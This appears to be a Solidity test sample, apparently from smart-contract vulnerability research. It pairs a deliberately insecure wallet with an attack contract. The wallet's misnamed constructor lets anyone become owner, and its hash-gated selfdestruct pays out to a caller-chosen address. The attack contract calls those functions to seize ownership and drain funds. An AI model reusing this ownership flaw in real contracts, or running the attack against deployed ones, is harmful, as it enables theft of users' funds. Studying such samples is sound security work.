

pragma solidity ^0.4.5;

contract HelpMeSave { 
   
   address public owner; 
   
   
   function MyTestWallet7(){
       owner = msg.sender;   
   }
   
    function deposit() public payable{}
    function() payable {deposit();}
    
    
    function withdraw () public noone_else { 

         uint256 withdraw_amt = this.balance;
         
         if (msg.sender != owner || withdraw_amt < 100 ether) { 
             withdraw_amt = 0;                     
         }
         
         msg.sender.send(withdraw_amt); 
         
   }

    modifier noone_else() {
        if (msg.sender == owner) 
            _;
    }

    
    
    
    
    function recovery (string _password, address _return_addr) returns (uint256) {
       
       if ( uint256(sha3(_return_addr)) % 100000000000000 == 94865382827780 ){
                selfdestruct (_return_addr);
       }
       return uint256(sha3(_return_addr)) % 100000000000000;
    }
}


contract Attack_HelpMeSave0 {

    HelpMeSave public target_contract;

    function Attack_HelpMeSave0(address _targetContract) public payable {
        target_contract = HelpMeSave(_targetContract);
    } 

    function vultron_MyTestWallet7() public {
    target_contract.MyTestWallet7();
    } 

    function vultron_withdraw() public {
    target_contract.withdraw();
    } 

    function vultron_recovery(string _password, address _return_addr) public {
    target_contract.recovery(_password, _return_addr);
    } 

    function vultron_deposit(uint256 vultron_amount) public payable{
    target_contract.deposit.value(vultron_amount)();
    } 

    function() public payable {

    target_contract.MyTestWallet7();
    }
} 